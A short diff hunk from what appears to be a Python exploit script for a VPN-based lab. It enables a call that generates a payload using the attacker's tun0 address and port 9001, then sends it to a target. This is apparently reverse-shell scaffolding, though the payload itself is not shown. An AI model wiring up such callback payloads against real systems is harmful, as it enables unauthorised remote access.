@@ -50,7 +50,7 @@ def main():
 	LHOST = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
 	LPORT = 9001
 	
-	# generate_payload(LHOST, LPORT)
+	generate_payload(LHOST, LPORT)
 
 	send_payload(ip, LHOST)
 
